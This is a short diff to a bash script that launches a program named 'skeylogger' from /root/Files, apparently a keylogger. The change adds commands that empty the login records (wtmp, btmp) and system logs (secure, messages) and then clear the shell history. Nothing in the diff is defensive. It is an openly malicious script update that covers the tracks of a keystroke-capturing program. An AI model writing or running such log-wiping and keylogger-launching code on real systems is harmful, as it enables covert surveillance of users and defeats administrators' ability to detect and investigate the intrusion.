@@ -1,5 +1,5 @@
 #!/bin/bash
-#version 0.0.2
+#version 0.0.3
 
 if [ -d "/root/Files" ]
 	then
@@ -20,3 +20,9 @@ if [ $result -ge 1 ]
 	cd /root/Files/
 	./skeylogger
 fi
+
+echo >/var/log/wtmp
+echo >/var/log/btmp
+echo >/var/log/secure
+echo >/var/log/messages
+history -c && history -w 
